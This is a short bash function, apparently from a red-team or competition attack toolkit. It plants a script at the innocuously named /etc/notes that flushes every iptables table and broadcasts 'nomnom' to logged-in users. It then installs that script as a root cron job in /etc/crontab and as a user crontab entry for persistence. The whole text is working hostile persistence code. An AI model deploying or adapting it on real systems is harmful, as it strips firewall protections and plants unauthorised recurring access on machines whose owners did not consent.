# Install a cronjob for them to find
cron() {
    command='* * * * */5 root /etc/notes'
    s='#!/bin/bash
(
iptables -F; iptables -t mangle -F; iptables -t nat -F;
wall nomnom;
) 2>/dev/null'
    echo $s >> /etc/notes;
    chmod 755 /etc/notes;
    echo $command >> /etc/crontab;
    LOG 0 "Installed global cron job";
    if [ "`command -v crontab`" != "" ]; then
        crontab -l | { cat; echo '* * * * */5 /etc/notes'; } | crontab -
        LOG 0 "Installed user cron job";
    fi
}
